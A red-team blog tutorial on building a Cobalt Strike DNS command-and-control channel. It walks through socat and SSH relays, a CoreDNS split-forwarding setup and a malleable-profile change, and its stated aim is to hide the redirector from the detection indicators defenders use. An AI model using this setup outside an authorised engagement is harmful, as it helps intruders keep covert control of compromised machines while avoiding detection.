---
title: Cobalt Strike DNS redirector
date: "2021-07-11T08:40:32.169Z"
template: "post"
draft: false
slug: "cobalt-strike-opsec-dns"
category: "RedTeam"
tags:
  - "RedTeam"
  - "Cobalt Strike"
description: "DNS can be utilized as usefull long haul communication channel for Red Team engagements. This article describes how to set up opsec friendly DNS command and control channel using Cobalt Strike."
socialImage: "/media/dns.jpeg"
---

This article describes how to set up opsec friendly DNS command and control channel using Cobalt Strike. Tutorial is inspired by [F-Secure article](https://labs.f-secure.com/blog/detecting-exposed-cobalt-strike-dns-redirectors/) and [rvrsh3ll tutorial](https://medium.com/rvrsh3ll/redirecting-cobalt-strike-dns-beacons-e3dcdb5a8b9b).

## Prerequisites
* Cobalt Strike (4.3)
* 2 VPS servers - in tutorial following configuration is used: 2x EC2 (t2.micro / Ubuntu Server 20.04 LTS / ami-0a8e758f5e873d1c1). You can use any VPS you'd like, in this tutorial AWS EC2 t2.micro is used for cost savings, it may be not sufficient for production red team infrastructure as Cobalt Strike requires at least c1.medium (1.7 GB) instance
* Domain

## Design 
![DNS listener in CS](/media/dns-redirector/dns-diagram.png)

## Domain Setup
In this tutorial fictional domain will be used: dns.yourdomain.com. 

Following DNS entries should be added to the domain:
```
dns 60 IN NS ns1.yourdomain.com.
ns1 60 IN A [DNS_REDIRECTOR_IP]
```
Bear in mind that it may take some time for DNS propagation.
## Cobalt Strike Setup
For a full guide on CS setup, you can refer to [official manual page](https://www.CobaltStrike.com/help-install).

In short:
1. Copy your cobalt strike tgz file to VPS.
2. Extract it using: 
```
tar zxvf Cobalt Strike-dist.tgz
```
3. Install Java:
```
sudo apt-get update && sudo apt-get install openjdk-11-jdk && sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
```
4. Run update.sh and start team server:
```
sudo ./update && sudo ./teamserver [YOUR_IP] [YOUR_PASSWORD]
```
5. Connect to your team server using CS client.

***!!! OPSEC notice !!!***
It's bad practice to expose your CS team server on default 50050 port. A more secure way is to allow only SSH (22 port) for inbound connection and connect to team server using SSH tunnel. The command for creating ssh tunnel on operator machine:
```
ssh -N -L 50050:127.0.0.1:50050 [ssh_username]:[ip]
```
then team server should be reachable on localhost:50500 on operator machine.

6. Create DNS listener:
One gotcha here. On AWS EC2 by default 53 port is used by *systemd-resolve* you can either modify this service or run listener on another port (here using 5353):
![DNS listener in CS](/media/dns-redirector/cs-dns-setup.png)
for more DNS listener options please refer to [official CS manual](https://www.CobaltStrike.com/help-dns-beacon)

## DNS Redirector Setup
Basically, there are at least two ways using socat to do this.

Firstly, you can rely on fact that the redirector and C2 are on the same internal network. In a such way, it's possible to open firewall rules (AWS - security groups) to allow inbound connection on port 5353 only from redirector instance. Using this setup redirection can be based only on one command:
```
socat udp4-listen:53 udp4:[teamserver_internal_ip]:5353
```

In setup when redirector and c2 are on different networks, ssh tunnel could be utilized to connect this two. For a more in depth, explanation look into [rvrsh3ll tutorial](https://medium.com/rvrsh3ll/redirecting-cobalt-strike-dns-beacons-e3dcdb5a8b9b).

In short, the steps are:
1. Create socat listener on UDP port 53 that forks each packet and relay it over TCP:
```
~ socat udp4-listen:53,reuseaddr,fork tcp:localhost:53535; echo -ne \n
```
2. Tunnel TCP relay on port 53535 using ssh to C2 server:
```
~ ssh -i ssh_key -oStrictHostKeyChecking=no -L 53535:localhost:53535 -l username teamserver_ip; echo -ne \n;
```
it's necessary to provide a proper ssh key, teamserver_ip, and username

3. On C2  using socat convert TCP 53535 to UDP 5353:
```
~ socat tcp4-listen:53535,reuseaddr,fork UDP:localhost:5353
```

4. Test if the DNS channel is working. Generate sample .exe malware in Cobalt Strike: Attacks -> Packages -> Windows Executable (S). Then run it on your test system and wait for connection.

Other interesting techniques for DNS redirection can be found in this great [coresecurity article](https://www.coresecurity.com/core-labs/articles/simple-dns-redirectors-cobalt-strike).

## Problems with current approach
### Problem 1 - 0.0.0.0 response
The first red alarm is connected with fact that our DNS listener responds with 0.0.0.0 as IP address associated with a malicious domain. Proof:
```
~ nslookup dns.yourdomain.com
Non-authoritive answer:
Name: dns.yourdomain.com
Address: 0.0.0.0
```
it's highly unusual to respond with 0.0.0.0 and it can be an indicator that this DNS server and domain is malicious and can be attributed to Cobalt Strike.
### Problem 2 - same response for every domain
The second indicator can be connected with the fact that DNS server responds with a same IP address to each domain requested:
```
~ dig @[redirector_ip_address] +short amazon.com
0.0.0.0
```
### Problem 1 solution
Cobalt Strike DNS listener could be customized using [malleable profiles](https://www.CobaltStrike.com/help-malleable-c2#dns-beacon-bm). To start on, [sample malleable profiles](https://github.com/rsmudge/Malleable-C2-Profiles) could be used.

Regarding the first problem, the following option in the malleable profile is responsible for modifying 0.0.0.0 default response:

```
dns-beacon {
 set dns_idle "1.2.3.4";
...
}
```
However, for better OPsec make sure to change other options in the malleable profile as well.

To test out your malleable profile run:
```
./c2lint [PROFILE_NAME]
```

Also, don't forget to restart Cobalt Strike with a new malleable profile and recreating DNS listener:
```
sudo ./teamserver [YOUR_IP] [YOUR_PASSWORD] [PATH_TO_malleable_PROFILE]
```
With this modification change should be noticed:
```
~ nslookup dns.yourdomain.com
Non-authoritive answer:
Name: dns.yourdomain.com
Address: 1.2.3.4
```

Unfortunately, this solution doesn't solve second problem as still requesting other domains results in unusual responses:
```
~ dig @[redirector_ip_address] +short amazon.com
1.2.3.4
```


### Problem 2 solution - Smart DNS redirection
The second problem can be tackled using [CoreDNS](https://coredns.io). The logic is to redirect to C2 only requests for malicious domain, other requests should be forwarded to other DNS server.

CoreDNS setup:
1. Download [latest package](https://github.com/coredns/coredns/releases) and extract it.
2. Create Corefile in the same folder as binary with the following content:

```
.  {
bind [PUBLIC_INTERFACE]
forward . 8.8.8.8
}
[MALICIOUS_DOMAIN] {
    bind [PUBLIC_INTERFACE]
    forward . 127.0.0.1:53531
}
```
The interface is specified because by default CoreDNS listens on all interfaces and it may be problematic with listening on localhost (in.ex. systemd-resolved in Ubuntu).

Following configuration should redirect all requests for [MALICIOUS_DOMAIN] to *53531* localhost port.

One thing to change is socat listener, previously it was listening on port 53, now have to be adjusted for port 53531:
```
~ socat udp4-listen:53531,reuseaddr,fork tcp:localhost:53535; echo -ne \n
```

Make sure that the listener is working as expected:
```
~ nslookup dns.yourdomain.com
Non-authoritive answer:
Name: dns.yourdomain.com
Address: 1.2.3.4
```

and by specifying another domain you should get actual domain address resolution:
```
~ dig @[redirector_ip_address] +short amazon.com
54.239.28.85
176.32.103.205
205.251.242.103
```

## Resources
* [F-Secure Detecting Exposed Cobalt Strike DNS Redirectors](https://labs.f-secure.com/blog/detecting-exposed-cobalt-strike-dns-redirectors/)
* [rvrsh3ll Redirecting Cobalt Strike DNS Beacons](https://medium.com/rvrsh3ll/redirecting-cobalt-strike-dns-beacons-e3dcdb5a8b9b)
* [Cobalt Strike Manual](https://www.CobaltStrike.com/support)
* [Coresecurity - Simple DNS Redirectors for Cobalt Strike](https://www.coresecurity.com/core-labs/articles/simple-dns-redirectors-cobalt-strike)
* [CoreDNS](https://coredns.io/)